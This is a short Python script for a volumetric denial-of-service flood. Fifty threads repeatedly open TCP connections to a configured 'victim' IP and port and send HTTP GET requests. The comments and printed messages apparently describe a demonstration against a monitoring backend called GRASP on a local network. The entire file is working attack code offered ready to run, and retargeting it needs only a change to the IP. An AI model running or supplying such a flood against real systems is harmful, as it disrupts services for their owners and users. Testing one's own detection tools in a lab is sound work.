import socket
import threading
import time

# --- CONFIGURATION ---
TARGET_IP = "192.168.1.2"  # THE IP OF THE VICTIM LAPTOP RUNNING GRASP
TARGET_PORT = 8000         # The port the GRASP backend is running on
THREADS = 50               # Number of parallel attackers

print(f"[*] Commencing Volumetric Flood against {TARGET_IP}:{TARGET_PORT}...")

def attack():
    while True:
        try:
            # Create a socket and connect
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((TARGET_IP, TARGET_PORT))
            
            # Send garbage HTTP GET requests extremely fast
            s.send(b"GET / HTTP/1.1\r\nHost: " + TARGET_IP.encode() + b"\r\n\r\n")
            s.close()
        except:
            pass

# Launch the flood in parallel threads
for i in range(THREADS):
    thread = threading.Thread(target=attack)
    thread.daemon = True
    thread.start()

print("[*] Flood active! Look at the GRASP Dashboard on the Victim PC.")
print("[*] Press Ctrl+C to stop the attack.")

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\n[*] Attack stopped.")
